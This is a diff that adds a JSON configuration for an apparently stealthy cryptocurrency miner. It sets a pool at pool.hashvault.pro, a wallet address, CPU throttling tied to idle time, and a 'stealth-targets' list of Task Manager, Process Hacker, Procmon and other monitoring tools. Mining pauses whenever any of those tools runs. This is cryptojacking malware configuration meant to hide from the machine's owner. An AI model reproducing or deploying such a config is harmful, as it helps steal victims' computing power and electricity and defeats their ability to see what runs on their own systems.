@@ -1,1 +1,15 @@
-
+{
+    "algo": "rx/0",
+    "pool": "pool.hashvault.pro",
+    "port": 443,
+    "wallet": "83TXvqsSG9WW9Tax9gPKu2WcDMeT4W1ASb6ixvpFCk139reQbhDYpuV9x6evKnNSZsEjEZ4L1R45JZ9xhE8BgUMJA5X2akq",
+    "password": "so_ch",
+    "nicehash": true,
+    "ssltls": true,
+    "max-cpu": 40,
+    "idle-wait": 3,
+    "idle-cpu": 60,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,resmon.exe,perfmon.exe,procexp.exe,procexp64.exe,Procmon.exe,Procmon64.exe,Procmon64a.exe,ProcessExplorer.exe,ProcessMonitor.exe,Autoruns.exe,ProcessLasso.exe,Depends.exe,HWMonitor.exe,SystemExplorer.exe,AnVirTaskManager.exe,ProcessActivityView.exe,ProcessHacker2.exe,AdvancedTaskManager.exe,ProcessMaster.exe,SecurityTaskManager.exe,WhatsRunning.exe,System Informer.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true
+}
